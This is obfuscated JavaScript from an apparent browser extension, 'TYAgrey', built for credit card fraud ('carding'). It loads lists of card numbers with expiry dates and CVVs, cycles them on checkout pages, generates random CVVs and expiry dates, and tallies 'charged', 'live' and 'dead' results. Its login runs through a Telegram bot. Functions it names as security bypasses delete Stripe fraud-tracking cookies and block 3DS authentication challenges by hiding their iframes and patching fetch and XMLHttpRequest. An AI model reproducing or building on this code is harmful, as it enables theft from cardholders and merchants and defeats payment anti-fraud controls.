          showWarning("✅ Logs cleared", "success");
        });
      }
    }
    const _0x24d242 = document.getElementById("proxyViewBtn");
    if (_0x24d242) {
      _0x24d242.addEventListener("click", function (_0x1974c9) {
        _0x1974c9.preventDefault();
        _0x1974c9.stopPropagation();
        const _0x49fdd1 = document.getElementById("proxyModal");
        if (_0x49fdd1) {
          _0x542ef4();
          _0x49fdd1.classList.remove("hidden");
          _0x49fdd1.classList.add("show");
        }
      });
    }
    const _0x42730f = document.getElementById("openNameSystemBtn");
    if (_0x42730f) {
      _0x42730f.addEventListener("click", function () {
        const _0xa9767b = document.getElementById("customNameInput");
        if (_0xa9767b) {
          _0xa9767b.focus();
          _0xa9767b.scrollIntoView({
            behavior: "smooth",
            block: "center"
          });
        }
      });
    }
    _0x4040e6();
    _0xb7cbed();
    _0x703850();
    _0x34ab5b();
    const _0x419300 = document.getElementById("closeBgInfoModal");
    const _0x5074be = document.getElementById("bgInfoOkBtn");
    if (_0x419300) {
      _0x419300.addEventListener("click", function () {
        const _0x153e6d = document.getElementById("bgInfoModal");
        if (_0x153e6d) {
          _0x153e6d.classList.remove("show");
          _0x153e6d.classList.add("hidden");
        }
        autoRestoreAfterModal();
      });
    }
    if (_0x5074be) {
      _0x5074be.addEventListener("click", function () {
        const _0x4f84a3 = document.getElementById("bgInfoModal");
        if (_0x4f84a3) {
          _0x4f84a3.classList.remove("show");
          _0x4f84a3.classList.add("hidden");
        }
        autoRestoreAfterModal();
      });
    }
  }
  function setupLoginListeners() {
    const _0x4f69d0 = document.getElementById("quickLoginBtn");
    const _0x2eb132 = document.getElementById("logoutBtn");
    if (_0x4f69d0) {
      _0x4f69d0.addEventListener("click", handleQuickLogin);
    }
    if (_0x2eb132) {
      _0x2eb132.addEventListener("click", handleLogout);
    }
  }
  async function handleQuickLogin() {
    const _0x319966 = document.getElementById("quickLoginBtn");
    if (!_0x319966) {
      return;
    }
    _0x319966.disabled = true;
    _0x319966.innerHTML = "⏳ Initializing...";
    try {
      const _0x516b97 = "tyagrey_" + Date.now() + "_" + Math.random().toString(36).substr(2, 9);
      const _0x55e665 = await sendToBackground({
        type: "API_REQUEST",
        endpoint: "create-session",
        payload: {
          session_id: _0x516b97
        }
      });
      if (_0x55e665.success) {
        showLoginError("Opening Telegram... Click START to login");
        _0x319966.innerHTML = "⏳ Waiting for login...";
        const _0x450419 = "https://t.me/tyagreyhitBot?start=" + _0x516b97;
        window.open(_0x450419, "_blank");
        pollSession(_0x516b97, _0x319966);
      } else {
        showLoginError("Failed to initialize. Try again.");
        _0x319966.disabled = false;
        _0x319966.innerHTML = "⚡ Quick Login";
      }
    } catch (_0x4736b3) {
      showLoginError("Connection error");
      _0x319966.disabled = false;
      _0x319966.innerHTML = "⚡ Quick Login";
    }
  }
  let currentPollInterval = null;
  async function pollSession(_0x4516a8, _0x415605) {
    const _0x14a14e = 60;
    let _0x1c5ba3 = 0;
    if (currentPollInterval) {
      clearInterval(currentPollInterval);
    }
    currentPollInterval = setInterval(async () => {
      _0x1c5ba3++;
      try {
        const _0x3ce2a5 = await sendToBackground({
          type: "API_REQUEST",
          endpoint: "check-session",
          payload: {
            session_id: _0x4516a8
          }
        });
        if (_0x3ce2a5.success && _0x3ce2a5.status === "completed" && _0x3ce2a5.token) {
          clearInterval(currentPollInterval);
          currentPollInterval = null;
          userId = _0x3ce2a5.user_id || "";
          userFirstName = _0x3ce2a5.first_name || "";
          savedToken = _0x3ce2a5.token;
          isLoggedIn = true;
          window.postMessage({
            type: "SAVE_LOGIN_STATE",
            token: _0x3ce2a5.token,
            userId: userId,
            firstName: userFirstName
          }, "*");
          const _0x5f4e0e = document.getElementById("loginScreen");
          const _0x49a2d8 = document.getElementById("mainDashboard");
          _0x5f4e0e?.classList.add("hidden");
          _0x49a2d8?.classList.remove("hidden");
          _0x49a2d8?.classList.add("dashboard-enter");
          updateIpBarUserInfo();
          startHitCountsRefresh();
          startPeriodicCloudSync();
          fetchDailyHits();
          const _0x21d888 = userFirstName ? "Welcome, " + userFirstName + "!" : "Login successful!";
          showWarning(_0x21d888, "success");
        } else if (_0x3ce2a5.success && _0x3ce2a5.status === "expired") {
          clearInterval(currentPollInterval);
          currentPollInterval = null;
          showLoginError("Session expired. Try again.");
          _0x415605.disabled = false;
          _0x415605.innerHTML = "⚡ Quick Login";
        } else if (_0x1c5ba3 >= _0x14a14e) {
          clearInterval(currentPollInterval);
          currentPollInterval = null;
          showLoginError("Timeout. Try again.");
          _0x415605.disabled = false;
          _0x415605.innerHTML = "⚡ Quick Login";
        }
      } catch (_0x258ea1) {}
    }, 2000);
  }
  async function validateToken(_0x4e5fc6) {
    if (!_0x4e5fc6 || _0x4e5fc6.length !== 6) {
      return {
        success: false,
        message: "Token must be 6 characters"
      };
    }
    const _0x53cfa4 = await sendToBackground({
      type: "VALIDATE_TOKEN",
      token: _0x4e5fc6
    });
    if (_0x53cfa4.success) {
      return {
        success: true,
        userId: String(_0x53cfa4.user_id),
        username: _0x53cfa4.username,
        firstName: _0x53cfa4.first_name,
        pfpUrl: _0x53cfa4.pfp_url || "",
        hits: _0x53cfa4.hits,
        attempts: _0x53cfa4.attempts,
        globalHits: _0x53cfa4.global_hits,
        userHits: _0x53cfa4.user_hits
      };
    } else {
      return {
        success: false,
        message: _0x53cfa4.error || "Invalid token"
      };
    }
  }
  async function validateSavedToken(_0x31c3c2) {
    if (!_0x31c3c2 || _0x31c3c2.length !== 6) {
      return false;
    }
    try {
      const _0x240e0b = await sendToBackground({
        type: "VALIDATE_TOKEN",
        token: _0x31c3c2
      });
      return _0x240e0b.success === true;
    } catch (_0x2cfd80) {
      return true;
    }
  }
  function showLoginError(_0xddc40d) {
    const _0x241fd5 = document.getElementById("loginError");
    if (_0x241fd5) {
      _0x241fd5.textContent = _0xddc40d;
      _0x241fd5.classList.remove("hidden");
      setTimeout(() => {
        _0x241fd5.classList.add("hidden");
      }, 3000);
    }
  }
  function handleLogout() {
    if (currentPollInterval) {
      clearInterval(currentPollInterval);
      currentPollInterval = null;
    }
    stopHitCountsRefresh();
    stopPeriodicCloudSync();
    userId = "";
    userFirstName = "";
    userPfpUrl = DEFAULT_PFP;
    userHitsCount = 0;
    userAttemptsCount = 0;
    globalHitsCount = 0;
    isLoggedIn = false;
    destroyTYAgreyOverlay();
    localStorage.removeItem("tyagrey_token");
    localStorage.removeItem("tyagrey_user_id");
    localStorage.removeItem("tyagrey_first_name");
    localStorage.removeItem(K.TOKEN);
    localStorage.removeItem(K.USER_ID);
    localStorage.removeItem(K.FIRST_NAME);
    localStorage.removeItem(K.SAVED_BINS);
    localStorage.removeItem(K.PANEL_QUICK_BINS);
    localStorage.removeItem(K.CARD_HISTORY);
    if (window.tyagreyStorage && window.tyagreyStorage.clearUserSession) {
      window.tyagreyStorage.clearUserSession();
    }
    if (typeof chrome !== "undefined" && chrome.storage && chrome.storage.local) {
      chrome.storage.local.remove(["tyagrey_current_bin"]);
    }
    window.postMessage({
      type: "SAVE_LOGIN_STATE",
      token: null
    }, "*");
    updateIpBarUserInfo();
    const _0x4ab04d = document.getElementById("quickLoginBtn");
    if (_0x4ab04d) {
      _0x4ab04d.disabled = false;
      _0x4ab04d.innerHTML = "⚡ Quick Login";
    }
    const _0x345727 = document.getElementById("loginError");
    if (_0x345727) {
      _0x345727.classList.add("hidden");
    }
    document.getElementById("loginScreen")?.classList.remove("hidden");
    document.getElementById("mainDashboard")?.classList.add("hidden");
    showWarning("Logged out. Use Quick Login to re-enter.", "info");
  }
  window.addEventListener("message", _0x1be231 => {
    if (_0x1be231.data.type === "OPEN_PROXY_MODAL_FROM_POPUP") {
      const _0x189132 = document.getElementById("proxyModal");
      if (_0x189132) {
        updateProxyModalContent();
        _0x189132.classList.remove("hidden");
        _0x189132.classList.add("show");
      }
    }
  });
  window.addEventListener("message", async _0x3bcecf => {
    if (_0x3bcecf.data && _0x3bcecf.data.type === "tyagrey_STORAGE_CHANGED") {
      const _0x1b479f = _0x3bcecf.data.changes || {};
      if (K.TOKEN in _0x1b479f) {
        if (_0x1b479f[K.TOKEN] && _0x1b479f[K.TOKEN] !== null) {
          const _0x2013d0 = await validateSavedToken(_0x1b479f[K.TOKEN]);
          if (_0x2013d0) {
            const _0x3a0dd0 = _0x1b479f[K.TOKEN];
            localStorage.setItem("tyagrey_token", _0x3a0dd0);
            localStorage.setItem(K.TOKEN, _0x3a0dd0);
            if (_0x1b479f[K.USER_ID]) {
              userId = _0x1b479f[K.USER_ID];
              localStorage.setItem("tyagrey_user_id", userId);
              localStorage.setItem(K.USER_ID, userId);
              savedId = userId;
            }
            if (_0x1b479f[K.CHAT_ID]) {
              userChatId = _0x1b479f[K.CHAT_ID];
              localStorage.setItem(K.CHAT_ID, userChatId);
            }
            if (_0x1b479f[K.FIRST_NAME]) {
              userFirstName = _0x1b479f[K.FIRST_NAME];
              localStorage.setItem("tyagrey_first_name", userFirstName);
              localStorage.setItem(K.FIRST_NAME, userFirstName);
            }
            isLoggedIn = true;
            if (!document.getElementById("tyagrey-new-overlay") && isPaymentPage()) {
              try {
                createTYAgreyOverlay();
              } catch (_0x4ff7c8) {}
            }
            try {
              const _0x4d2f21 = await validateToken(_0x3a0dd0);
              if (_0x4d2f21.success) {
                userPfpUrl = _0x4d2f21.pfpUrl || DEFAULT_PFP;
                userHitsCount = _0x4d2f21.userHits ?? _0x4d2f21.hits ?? 0;
                globalHitsCount = _0x4d2f21.globalHits ?? globalHitsCount;
                userAttemptsCount = _0x4d2f21.attempts || 0;
              }
            } catch (_0x23d6d6) {}
            await Promise.race([fetchHitCounts(), new Promise(_0x15ca8c => setTimeout(_0x15ca8c, 2000))]);
            const _0x2b8d92 = document.getElementById("loginScreen");
            const _0x59f0d9 = document.getElementById("mainDashboard");
            if (_0x2b8d92 && _0x59f0d9 && !_0x2b8d92.classList.contains("hidden")) {
              _0x2b8d92.classList.add("hidden");
              _0x59f0d9.classList.remove("hidden");
              showWarning("Logged in from another tab", "success");
            }
            updateIpBarUserInfo();
            startHitCountsRefresh();
            startPeriodicCloudSync();
            fetchDailyHits();
          }
        } else {
          stopHitCountsRefresh();
          stopPeriodicCloudSync();
          isLoggedIn = false;
          userId = "";
          userFirstName = "";
          userPfpUrl = DEFAULT_PFP;
          userHitsCount = 0;
          userAttemptsCount = 0;
          globalHitsCount = 0;
          destroyTYAgreyOverlay();
          localStorage.removeItem("tyagrey_token");
          localStorage.removeItem("tyagrey_user_id");
          localStorage.removeItem("tyagrey_first_name");
          localStorage.removeItem(K.TOKEN);
          localStorage.removeItem(K.USER_ID);
          localStorage.removeItem(K.FIRST_NAME);
          updateIpBarUserInfo();
          const _0x2e23ff = document.getElementById("loginScreen");
          const _0x11153f = document.getElementById("mainDashboard");
          if (_0x2e23ff && _0x11153f) {
            _0x2e23ff.classList.remove("hidden");
            _0x11153f.classList.add("hidden");
          }
          showWarning("Logged out from another tab. Use Quick Login to re-enter.", "info");
        }
      }
      if (_0x1b479f[K.SAVED_BINS] !== undefined && Array.isArray(_0x1b479f[K.SAVED_BINS])) {
        const _0x2ab458 = normalizeBinArray(_0x1b479f[K.SAVED_BINS]);
        localStorage.setItem(K.SAVED_BINS, JSON.stringify(_0x2ab458));
        const _0x346350 = () => {
          populateBinInputs();
          updateSwitchBtnVisibility();
          rebuildBinListUI();
        };
        if (window.tyagreyStorage && window.tyagreyStorage.loadPanelQuickBins) {
          window.tyagreyStorage.loadPanelQuickBins(_0x362d6b => {
            if (!isExplicitPanelQuickBins(_0x362d6b)) {
              savedBINs = _0x2ab458.slice();
              currentBinIndex = Math.min(currentBinIndex, Math.max(0, savedBINs.length - 1));
            }
            _0x346350();
          });
        } else {
          savedBINs = _0x2ab458.slice();
          currentBinIndex = Math.min(currentBinIndex, Math.max(0, savedBINs.length - 1));
          _0x346350();
        }
      }
      if (_0x1b479f[K.PANEL_QUICK_BINS] !== undefined && Array.isArray(_0x1b479f[K.PANEL_QUICK_BINS])) {
        savedBINs = normalizeBinArray(_0x1b479f[K.PANEL_QUICK_BINS]);
        currentBinIndex = Math.min(currentBinIndex, Math.max(0, savedBINs.length - 1));
        localStorage.setItem(K.PANEL_QUICK_BINS, JSON.stringify(savedBINs));
        populateBinInputs();
        updateSwitchBtnVisibility();
        rebuildBinListUI();
      }
      if (_0x1b479f[K.CUSTOM_NAME] !== undefined) {
        customName = _0x1b479f[K.CUSTOM_NAME];
        localStorage.setItem(K.CUSTOM_NAME, customName);
        const _0x571cf0 = document.getElementById("customNameInput");
        if (_0x571cf0) {
          _0x571cf0.value = customName;
        }
      }
      if (_0x1b479f[K.CUSTOM_EMAIL] !== undefined) {
        customEmail = _0x1b479f[K.CUSTOM_EMAIL];
        localStorage.setItem(K.CUSTOM_EMAIL, customEmail);
        const _0x59d0c1 = document.getElementById("customEmailInput");
        if (_0x59d0c1) {
          _0x59d0c1.value = customEmail;
        }
      }
      if (_0x1b479f[COUNTRY_REGION_STORAGE_KEY] !== undefined && _0x1b479f[COUNTRY_REGION_STORAGE_KEY]) {
        const _0x43e5e6 = _0x1b479f[COUNTRY_REGION_STORAGE_KEY];
        countryRegionEnabled = _0x43e5e6.enabled !== false;
        countryRegionCode = _0x43e5e6.countryCode || "US";
        countryRegionName = _0x43e5e6.countryName || COUNTRY_DISPLAY_NAMES[countryRegionCode] || "United States";
        localStorage.setItem(COUNTRY_REGION_STORAGE_KEY, JSON.stringify(_0x43e5e6));
        const _0xb37120 = document.getElementById("countryRegionSelect");
        const _0x1247e9 = document.getElementById("countryRegionToggle");
        if (_0x1247e9) {
          _0x1247e9.checked = countryRegionEnabled;
        }
        if (_0xb37120) {
          _0xb37120.disabled = !countryRegionEnabled;
          _0xb37120.value = countryRegionCode || "US";
        }
      }
      if (_0x1b479f[K.TOGGLE_TG_FORWARD] !== undefined) {
        tgForwardEnabled = _0x1b479f[K.TOGGLE_TG_FORWARD] !== false;
        localStorage.setItem(K.TOGGLE_TG_FORWARD, tgForwardEnabled);
      }
      if (_0x1b479f[K.TOGGLE_HIT_SOUND] !== undefined) {
        localStorage.setItem(K.TOGGLE_HIT_SOUND, _0x1b479f[K.TOGGLE_HIT_SOUND]);
      }
      if (_0x1b479f[K.TOGGLE_AUTO_SS] !== undefined) {
        localStorage.setItem(K.TOGGLE_AUTO_SS, _0x1b479f[K.TOGGLE_AUTO_SS]);
      }
      if (_0x1b479f[K.SAVED_ID] !== undefined) {
        savedId = _0x1b479f[K.SAVED_ID];
        localStorage.setItem(K.SAVED_ID, savedId);
      }
      if (_0x1b479f[K.BG_COLOR] !== undefined) {
        pageBackgroundColor = _0x1b479f[K.BG_COLOR];
        localStorage.setItem(K.BG_COLOR, _0x1b479f[K.BG_COLOR]);
      }
      if (_0x1b479f[K.HAS_CUSTOM_COLOR] !== undefined) {
        localStorage.setItem(K.HAS_CUSTOM_COLOR, _0x1b479f[K.HAS_CUSTOM_COLOR]);
      }
      if (_0x1b479f[K.BG_ENABLED] !== undefined) {
        localStorage.setItem(K.BG_ENABLED, _0x1b479f[K.BG_ENABLED]);
      }
      if (_0x1b479f[K.PAGE_BG_COLOR] !== undefined) {
        localStorage.setItem(K.PAGE_BG_COLOR, _0x1b479f[K.PAGE_BG_COLOR]);
      }
      if (_0x1b479f[K.PAGE_HAS_CUSTOM] !== undefined) {
        userHasSetCustomColor = _0x1b479f[K.PAGE_HAS_CUSTOM] === true || _0x1b479f[K.PAGE_HAS_CUSTOM] === "true";
      }
      if (_0x1b479f[K.LOGS] !== undefined) {
        let _0x40639d = _0x1b479f[K.LOGS];
        if (typeof _0x40639d === "string") {
          try {
            _0x40639d = JSON.parse(_0x40639d);
          } catch (_0x52cce8) {
            _0x40639d = [];
          }
        }
        if (Array.isArray(_0x40639d)) {
          cardHistory = _0x40639d;
        }
      }
      if (_0x1b479f[K.LOGS_CLEARED_AT] !== undefined) {
        if (_0x1b479f[K.LOGS_CLEARED_AT]) {
          cardHistory = [];
          if (typeof updateHistoryDisplay === "function") {
            updateHistoryDisplay();
          }
        }
      }
      if (_0x1b479f[K.PROXY_ENABLED] !== undefined) {
        localStorage.setItem(K.PROXY_ENABLED, _0x1b479f[K.PROXY_ENABLED]);
      }
      if (_0x1b479f[K.PROXY_STRING] !== undefined) {
        localStorage.setItem(K.PROXY_STRING, _0x1b479f[K.PROXY_STRING]);
      }
      if (_0x1b479f[K.PROXY_INFO] !== undefined) {
        localStorage.setItem(K.PROXY_INFO, typeof _0x1b479f[K.PROXY_INFO] === "object" ? JSON.stringify(_0x1b479f[K.PROXY_INFO]) : _0x1b479f[K.PROXY_INFO]);
      }
      if (_0x1b479f[K.MUSIC_NAME] !== undefined) {
        localStorage.setItem(K.MUSIC_NAME, _0x1b479f[K.MUSIC_NAME]);
      }
      if (_0x1b479f[K.CARD_HISTORY] !== undefined) {
        let _0x48d468 = _0x1b479f[K.CARD_HISTORY];
        if (typeof _0x48d468 === "string") {
          try {
            _0x48d468 = JSON.parse(_0x48d468);
          } catch (_0x471922) {
            _0x48d468 = [];
          }
        }
        if (Array.isArray(_0x48d468)) {
          localStorage.setItem(K.CARD_HISTORY, JSON.stringify(_0x48d468));
        }
      }
      if (_0x1b479f[K.LAST_SEEN_BIN_TIME] !== undefined) {
        localStorage.setItem(K.LAST_SEEN_BIN_TIME, _0x1b479f[K.LAST_SEEN_BIN_TIME]);
      }
    }
  });
  function rebuildBinListUI() {
    const _0x9a4427 = document.getElementById("binListContainer");
    if (!_0x9a4427) {
      return;
    }
    _0x9a4427.innerHTML = "";
    savedBINs.forEach((_0xe80b8c, _0x4b6476) => {
      const _0x26e55e = document.createElement("div");
      _0x26e55e.className = "bin-row";
      _0x26e55e.style.cssText = "display:flex;gap:6px;margin-bottom:4px;align-items:center;";
      const _0x47244b = document.createElement("input");
      _0x47244b.type = "text";
      _0x47244b.className = "bin-input";
      _0x47244b.value = _0xe80b8c;
      _0x47244b.maxLength = 8;
      _0x47244b.placeholder = "Enter BIN";
      _0x47244b.dataset.index = _0x4b6476;
      _0x47244b.addEventListener("input", () => {
        savedBINs[_0x4b6476] = _0x47244b.value.replace(/\D/g, "");
      });
      if (_0x4b6476 === 0) {
        const _0x39f013 = document.createElement("button");
        _0x39f013.className = "bin-add-btn";
        _0x39f013.textContent = "+";
        _0x39f013.addEventListener("click", () => {
          savedBINs.push("");
          rebuildBinListUI();
        });
        _0x26e55e.appendChild(_0x47244b);
        _0x26e55e.appendChild(_0x39f013);
      } else {
        const _0xf38fba = document.createElement("button");
        _0xf38fba.className = "bin-remove-btn";
        _0xf38fba.textContent = "-";
        _0xf38fba.addEventListener("click", () => {
          savedBINs.splice(_0x4b6476, 1);
          saveBINs(savedBINs, {
            panelOnly: true
          });
          rebuildBinListUI();
        });
        _0x26e55e.appendChild(_0x47244b);
        _0x26e55e.appendChild(_0xf38fba);
      }
      _0x9a4427.appendChild(_0x26e55e);
    });
    if (savedBINs.length === 0) {
      savedBINs.push("");
      rebuildBinListUI();
    }
  }
  window.addEventListener("message", _0x102f09 => {
    if (_0x102f09.data && _0x102f09.data.type === "EXTENSION_INVALIDATED") {
      setTimeout(() => {
        window.postMessage({
          type: "GET_LOGIN_STATE"
        }, "*");
      }, 2000);
    }
  });
  let musicPlayer = null;
  function toggleMusic() {
    const _0x139903 = document.getElementById("musicToggleBtn");
    if (isMusicPlaying) {
      stopMusic();
      if (_0x139903) {
        _0x139903.textContent = "🎵";
      }
      isMusicPlaying = false;
    } else {
      const _0x2b61e6 = playMusicMp3();
      if (_0x2b61e6) {
        if (_0x139903) {
          _0x139903.textContent = "🎶";
        }
        isMusicPlaying = true;
      }
    }
  }
  function stopMusic() {
    window.postMessage({
      type: "STOP_BACKGROUND_MUSIC"
    }, "*");
    if (musicPlayer) {
      try {
        musicPlayer.pause();
        musicPlayer.currentTime = 0;
        if (musicPlayer.parentNode) {
          musicPlayer.parentNode.removeChild(musicPlayer);
        }
      } catch (_0x5bf9e0) {}
      musicPlayer = null;
    }
    const _0x57c070 = document.getElementById("tyagreyAudioPlayer");
    if (_0x57c070) {
      try {
        _0x57c070.pause();
        _0x57c070.remove();
      } catch (_0x1cb7d9) {}
    }
    isMusicPlaying = false;
  }
  function playMusicMp3() {
    stopMusic();
    const _0x26cca5 = localStorage.getItem(K.MUSIC_NAME);
    if (_0x26cca5) {
      window.postMessage({
        type: "PLAY_BACKGROUND_MUSIC",
        volume: soundVolume
      }, "*");
      isMusicPlaying = true;
      const _0x51a007 = document.getElementById("musicToggleBtn");
      if (_0x51a007) {
        _0x51a007.textContent = "🎶";
      }
      showWarning("👀 Custom music playing", "success");
      return true;
    }
    window.postMessage({
      type: "GET_MUSIC_URL"
    }, "*");
    return true;
  }
  window.addEventListener("message", _0xf4e368 => {
    if (_0xf4e368.source !== window) {
      return;
    }
    if (_0xf4e368.data.type === "MUSIC_URL") {
      const _0x180cd6 = _0xf4e368.data.url;
      try {
        musicPlayer = new Audio(_0x180cd6);
        musicPlayer.loop = true;
        musicPlayer.volume = soundVolume;
        musicPlayer.onloadeddata = () => {
          musicPlayer.play().then(() => {
            isMusicPlaying = true;
            const _0x560c9b = document.getElementById("musicToggleBtn");
            if (_0x560c9b) {
              _0x560c9b.textContent = "🎶";
            }
            showWarning("👀 Music playing", "success");
          }).catch(_0x3d3cad => {
            showWarning("Tap 🎵 again", "info");
          });
        };
        musicPlayer.onerror = _0x3f4ae4 => {
          showWarning("⚠️ Music not available", "error");
        };
      } catch (_0x4ccc55) {
        showWarning("⚠️ Cannot play music", "error");
      }
    }
  });
  function setMode(_0x54d557) {
    currentMode = _0x54d557;
    document.querySelectorAll(".mode-btn").forEach(_0x4e96ac => {
      _0x4e96ac.classList.toggle("active", _0x4e96ac.dataset.mode === _0x54d557);
    });
    const _0x10d147 = document.getElementById("binSection");
    const _0x1ed9fe = document.getElementById("ccSection");
    if (_0x54d557 === "bin") {
      _0x10d147?.classList.remove("hidden");
      _0x1ed9fe?.classList.add("hidden");
    } else {
      _0x10d147?.classList.add("hidden");
      _0x1ed9fe?.classList.remove("hidden");
    }
  }
  function updateCcCount() {
    const _0x54be75 = document.getElementById("ccTextarea");
    const _0x3d82c0 = document.getElementById("ccCount");
    if (!_0x54be75 || !_0x3d82c0) {
      return;
    }
    const _0x3ab350 = _0x54be75.value.split("\n").filter(_0x9d185e => _0x9d185e.trim() && _0x9d185e.includes("|"));
    _0x3d82c0.textContent = Math.min(_0x3ab350.length, 20);
  }
  function saveCcListFunc() {
    const _0x5600bc = document.getElementById("ccTextarea");
    if (!_0x5600bc) {
      return;
    }
    const _0x4c96fd = _0x5600bc.value.split("\n").map(_0x463378 => _0x463378.trim()).filter(_0x5418c1 => {
      const _0x2c7d84 = _0x5418c1.split("|");
      return _0x2c7d84.length === 4 && _0x2c7d84[0].length >= 13;
    }).slice(0, 20);
    ccList = _0x4c96fd;
    currentCCIndex = 0;
    const _0x181604 = document.querySelector(".cc-info");
    if (_0x181604) {
      _0x181604.textContent = ccList.length + " cards loaded";
    }
    const _0x4e03f4 = document.getElementById("ccModal");
    _0x4e03f4.classList.remove("show");
    setTimeout(() => _0x4e03f4.classList.add("hidden"), 400);
    showWarning("✅ " + ccList.length + " cards saved", "success");
  }
  function getNextCC() {
    if (ccList.length === 0 || currentCCIndex >= ccList.length) {
      return null;
    }
    const _0x5989c4 = ccList[currentCCIndex];
    currentCCIndex++;
    const _0xbb963e = _0x5989c4.split("|");
    return {
      number: _0xbb963e[0],
      month: _0xbb963e[1],
      year: _0xbb963e[2],
      cvv: _0xbb963e[3]
    };
  }
  function parseCustomCheckoutCCList(_0x16c45d) {
    if (!_0x16c45d || !_0x16c45d.trim()) {
      return [];
    }
    const _0x2e6bcd = _0x16c45d.split(/[\n\r]+/).filter(_0x1b07b7 => _0x1b07b7.trim());
    const _0x28ebf8 = [];
    for (const _0x54f03e of _0x2e6bcd) {
      const _0x3add3e = _0x54f03e.trim();
      if (!_0x3add3e) {
        continue;
      }
      let _0x272178;
      if (_0x3add3e.includes("|")) {
        _0x272178 = _0x3add3e.split("|").map(_0x410392 => _0x410392.trim());
      } else if (_0x3add3e.includes(",")) {
        _0x272178 = _0x3add3e.split(",").map(_0x3e189c => _0x3e189c.trim());
      } else {
        _0x272178 = _0x3add3e.split(/\s+/);
      }
      if (_0x272178.length >= 4) {
        _0x28ebf8.push(_0x272178[0] + "|" + _0x272178[1] + "|" + _0x272178[2] + "|" + _0x272178[3]);
      } else if (_0x272178.length === 1 && _0x272178[0].length >= 13) {
        _0x28ebf8.push(_0x272178[0]);
      }
    }
    return _0x28ebf8;
  }
  function loadCustomCheckoutSettingsFromStorage() {
    try {
      const _0x3aff39 = localStorage.getItem("tyagrey_custom_checkout_settings");
      if (_0x3aff39) {
        return JSON.parse(_0x3aff39);
      }
    } catch (_0x499a88) {}
    return null;
  }
  function getCustomCheckoutNextCC() {
    if (customCheckoutCcList.length === 0 || customCheckoutCurrentCcIndex >= customCheckoutCcList.length) {
      return null;
    }
    const _0x4f5914 = customCheckoutCcList[customCheckoutCurrentCcIndex];
    customCheckoutCurrentCcIndex++;
    const _0x5e997d = _0x4f5914.split("|");
    return {
      number: _0x5e997d[0] || "",
      month: _0x5e997d[1] || randomMonth(),
      year: _0x5e997d[2] || randomYear(),
      cvv: _0x5e997d[3] || randomCvv(_0x5e997d[0] || "")
    };
  }
  function updateCustomCheckoutStats(_0x16a504) {
    if (!customCheckoutActive) {
      return;
    }
    customCheckoutStats.total++;
    if (_0x16a504 === "charged" || _0x16a504 === "hit") {
      customCheckoutStats.charged++;
    }
    if (_0x16a504 === "live" || _0x16a504 === "success") {
      customCheckoutStats.live++;
    }
    if (_0x16a504 === "dead" || _0x16a504 === "fail") {
      customCheckoutStats.dead++;
    }
    localStorage.setItem("tyagrey_cc_stats", JSON.stringify(customCheckoutStats));
    reportCustomCheckoutStats();
  }
  function reportCustomCheckoutStats() {
    try {
      window.postMessage({
        type: "CUSTOM_CHECKOUT_STATS_UPDATE",
        stats: customCheckoutStats
      }, "*");
      if (typeof chrome !== "undefined" && chrome.runtime && chrome.runtime.sendMessage) {
        chrome.runtime.sendMessage({
          type: "CUSTOM_CHECKOUT_STATS_UPDATE",
          stats: customCheckoutStats
        }).catch(() => {});
      }
    } catch (_0x281e48) {}
  }
  function applySecurityBypasses() {
    if (!customCheckoutActive || !customCheckoutSettings) {
      return;
    }
    const _0x2a88ef = customCheckoutSettings;
    if (_0x2a88ef.securityPasted !== false) {
      try {
        if (navigator.clipboard && navigator.clipboard.writeText) {
          navigator.clipboard.writeText("").catch(() => {});
        }
      } catch (_0x1498a1) {}
    }
    if (_0x2a88ef.securityTiming) {}
    if (_0x2a88ef.securityTracking !== false) {
      try {
        const _0x45714e = document.cookie.split(";").find(_0x2d2fd2 => _0x2d2fd2.trim().startsWith("__stripe_mid="));
        if (_0x45714e) {
          document.cookie = "__stripe_mid=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
          document.cookie = "__stripe_sid=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
        }
      } catch (_0x3df91d) {}
    }
    if (has3DSAccess() && _0x2a88ef.threeDsEnabled) {
      bypass3DSChallenges();
    }
  }
  function bypass3DSChallenges() {
    try {
      const _0x1b2602 = document.querySelectorAll("iframe[src*=\"3ds\"], iframe[src*=\"3ds\"], iframe[src*=\"acs\"], iframe[src*=\"challenge\"], iframe[src*=\"securekey\"], iframe[src*=\"safkey\"]");
      _0x1b2602.forEach(_0x25504a => {
        _0x25504a.style.display = "none";
        _0x25504a.style.visibility = "hidden";
        _0x25504a.style.opacity = "0";
        _0x25504a.style.position = "absolute";
        _0x25504a.style.left = "-9999px";
        console.log("[TYAgrey][3DS] Blocked 3DS iframe:", _0x25504a.src);
      });
      const _0x233761 = document.querySelectorAll("[class*=\"3ds\"], [class*=\"3DS\"], [id*=\"3ds\"], [id*=\"3DS\"], [class*=\"challenge\"], [class*=\"Challenge\"], [class*=\"safkey\"], [class*=\"SafeKey\"]");
      _0x233761.forEach(_0x41fb33 => {
        _0x41fb33.style.display = "none";
        _0x41fb33.style.visibility = "hidden";
        console.log("[TYAgrey][3DS] Hidden 3DS modal:", _0x41fb33.className || _0x41fb33.id);
      });
      const _0x4aa730 = XMLHttpRequest.prototype.open;
      XMLHttpRequest.prototype.open = function (_0x1e5d2f, _0x579b06) {
        if (_0x579b06 && typeof _0x579b06 === "string") {
          const _0x4cc0f3 = _0x579b06.toLowerCase();
          if (_0x4cc0f3.includes("3ds") || _0x4cc0f3.includes("challenge") || _0x4cc0f3.includes("acs") || _0x4cc0f3.includes("safkey")) {
            console.log("[TYAgrey][3DS] Blocked 3DS request:", _0x579b06);
            return;
          }
        }
        return _0x4aa730.apply(this, arguments);
      };
      const _0x26bb20 = window.fetch;
      window.fetch = function (_0x3016aa, _0x21ec3b) {
        if (_0x3016aa && typeof _0x3016aa === "string") {
          const _0xe8303d = _0x3016aa.toLowerCase();
          if (_0xe8303d.includes("3ds") || _0xe8303d.includes("challenge") || _0xe8303d.includes("acs") || _0xe8303d.includes("safkey")) {
            console.log("[TYAgrey][3DS] Blocked 3DS fetch:", _0x3016aa);
            return Promise.reject(new Error("3DS request blocked"));
          }
        }
        return _0x26bb20.apply(this, arguments);
      };
      console.log("[TYAgrey][3DS] 3DS bypass activated");
    } catch (_0x527a86) {
      console.error("[TYAgrey][3DS] Bypass error:", _0x527a86);
    }
  }
  function detectGatewayEnhanced() {
    const _0x50f88a = window.location.hostname || "";
    const _0x420c13 = document.body ? document.body.innerHTML.substring(0, 10000) : "";
    if (_0x50f88a.includes("stripe") || _0x420c13.includes("stripe.com") || _0x420c13.includes("Stripe") || _0x420c13.includes("data-stripe")) {
      return "stripe";
    }
